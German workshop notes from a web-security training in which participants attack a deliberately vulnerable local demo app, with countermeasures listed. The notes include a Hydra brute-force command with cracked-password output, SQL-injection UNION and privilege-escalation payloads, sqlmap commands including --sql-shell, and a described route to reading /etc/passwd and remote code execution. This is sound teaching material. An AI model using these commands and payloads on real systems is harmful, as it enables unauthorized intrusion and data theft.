# Workshop-Notes Security-Hacking

## Beispiel-Anwendung mal gestartet (erst DB, dann Tomcat)

Nach Sicherheitslücken gesucht

### Findings

* Session-ID ist in URL ersichtlich
  => kann per Konfiguration auf "nur im Cookie" eingestellt werden
* Bei Anmeldung kann über "Schrott-Daten" ein Stack-Trace erzeugt werden
* Kein HTTPS
* SQL-Injection ist möglich (wo genau?)
* Man sieht auch Infos zum Web-Server ("Apache Tomcat/7.0.61")
  * Damit ist eine "CVE-Recherche" möglich (cvedetails.com)
* Angrif auf die DB: exploit-db.com, remote-code-execution möglich

## Tools

### Nikto

findet diverse Default-Dinge, die man alle nicht live haben sollte

### OWASP-ZAP

* "Intercepting Proxy"

### Hydra

* Admin-Passwort erschleichen mittels Brute-Force-Attack
* Passwort-Listen übers Internet erhältlich (git -> danielmiessler / SecListe)

      root@kali:~/Downloads/Marathon# hydra -t 4 -f -l admin -P Marathon-Web/top-pw-cracking-list.txt localhost -s 8080 http-form-post "/marathon/secured/j_security_check:j_username=^USER^&j_password=^PASS^:Wrong"
      Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

      Hydra (<http://www.thc.org/thc-hydra)> starting at 2017-11-10 10:31:37
      [DATA] max 4 tasks per 1 server, overall 4 tasks, 1001 login tries (l:1/p:1001), ~251 tries per task
      [DATA] attacking http-post-form://localhost:8080//marathon/secured/j_security_check:j_username=^USER^&j_password=^PASS^:Wrong
      [8080][http-post-form] host: localhost   login: admin   password: 4dm1n
      [STATUS] attack finished for localhost (valid pair found)
      1 of 1 target successfully completed, 1 valid password found
      Hydra (<http://www.thc.org/thc-hydra)> finished at 2017-11-10 10:31:48

## SQL-Injection

* Gegenmaßnahmen: Prepared-Statements, OR-Mapper
* Such-Feld: Lars' eingeben => Stack-Trace => HSQL-DB
* Problem: String-Verkettung - Anti-Pattern "Mix Data with Code" (aus Daten wird Code) => nicht tun (sondern z.B. Prepared-Statement)
* URL der SearchResults.jsp:
  * Eingabe von <http://localhost:8080/marathon/showResults.page?marathon=2-1>
  * => Ergebnis ist identisch zu ...1, da wird also die Subtraktion ausgeführt
  * analog: ...and 1=1, und and 1=2
  * auch wieder String-Verkettung
* Datumsfeld beim Erzeugen eines Accounts
  * Es wird zwar ein Prepared-Statement verwendet, aber "darin" auch wieder eine String-Verkettung beim Datum gemacht

* Ausnutzen des Search-Fields => Datenmodell auslesen via SQL-Union-Statement
* Anzahl Spalten erraten
  * 'AND 1=2 UNION ALL SELECT null,null,null,null,null,null,null,null,null FROM information_schema.columns WHERE table_schema='PUBLIC' --

* Datentypen der Spalten erraten
  * 'AND 1=2 UNION ALL SELECT 'X',null,null,null,null,null,null,null,null FROM information_schema.columns WHERE table_schema='PUBLIC' --

* Daten verändern (schreiben)
  * '; insert into app_role(username,rolename) values ('test','administrator');commit;SELECT null,null,null,null,null,null,null,null,null FROM information_schema.columns WHERE table_schema='PUBLIC'--
  * (Mist, falsch abgetippt, Statement funktioniert nicht...)

### sqlmap

* maschinelles Auslesen von Informationen
* sqlmap --flush-session -u <http://localhost:8080/marathon/showResults.page?marathon=0>
* sqlmap --dbs -u <http://localhost:8080/marathon/showResults.page?marathon=0>
* sqlmap -D PUBLIC --tables -u <http://localhost:8080/marathon/showResults.page?marathon=0>
* sqlmap -D PUBLIC --tables --columns -u <http://localhost:8080/marathon/showResults.page?marathon=0>
* sqlmap --sql-shell -u <http://localhost:8080/marathon/showResults.page?marathon=0>

* Ausnutzen von "Blind"-SQL-Injection über Antwortzeit
* geht auch mit sqlmap

## Vorführung

* Umgestellt auf PostgreSQL...
* Mittels der "sql-shell" (von oben) via sqlmap auf das Dateisystem zugreifen...
* Temporäre Tabelle anlegen (create table...), dann /etc/passwd importiert
* Schreibender Zugriff... (create "blob", blob mit C-Code befüllen, blob exportieren)
* Dann "aufrufen" - funktioniert erschreckenderweise - Remote Code Execution ist möglich!!!
* "Reverse Shell" erzeugt

## Gegenmaßnahmen

* Input-Validierung !!! so weit vorne wie möglich, wo stark wie möglich !!!
* Länge von u.a. URL-Parametern, am besten auf konkrete Datentypen beschränken (z.B. Zahlen nicht als String)
* Datenbank-User beschränken (z.B. keine BLOBs, kein Zugriff aufs Dateisystem)

## Cross-Site-Scripting

* XSS-Angriffe greifen den Client an (Daten stehlen: Cookies, Passworte, Einkaufen, ...)
* Gegenmaßnahme z.B. WAF (Web-Application-Firewall, gibt es als "mod" für Apache)
* DOM-based XSS
  * "Sprechblase" mit dynamisch erzeugtem Mailto-Link
  * Problem: aus innerHTML heraus wird kein Script ausgeührt
  * Lösung: über zusätzliches img-Tag
* Bsp.: "Infektion" einer "anderen" Anwendung, die auch auf die kompromittierten Daten zugreift
* www.openbugbounty.org

## Inrusion via XML

* DTD-Injection "XML eXternal Entity (XEE)"
* Z.B.: mittels file-Protokoll-Handler die /etc/passwd ausgelesen
* Lösung: DTD- und Entity-Handling via Konfiguration des XML-Parsers deaktivieren

## Intrusion via File-Up- oder -Download

* "File-Path-Traversal"
* Lösungsalternativen
  * Dateien möglichst nicht im Dateisystem speichern, sondern in einer DB als LOB
  * Dateinamen randomisieren, zum Benutzer speichern, und über diesen randomisierten Dateinamen ausgeben
  * Parent-Directory prüfen gegen erwartetes Verzeichnis
* Verwenden von ZAP um Lücken zu finden
  * Hat einen "passiven" Modus, der schon bisschen was findet
  * Hat einen "Spider"-Modus, der aber nicht so dolle ist (v.a. bei SPAs)
  * Gibt auch ein Jenkins-Plugin dafür (war auch im Talk "von Robert" mit Bestandteil)
  * Anti-Automations-Mechanismen wie z.B. ein Captcha,müssen dafür natürlich deaktiviert werden

## Statische Code-Analyse

* "DAST" und "SAST"
* FindBugs-Plug-In "FindSecurityBugs" (für Java natürlich)
* Xanitizer-Suite

## Präsentation

* <https://www.christian-schneider.net/downloads/Toolbased_WebPentesting.pdf>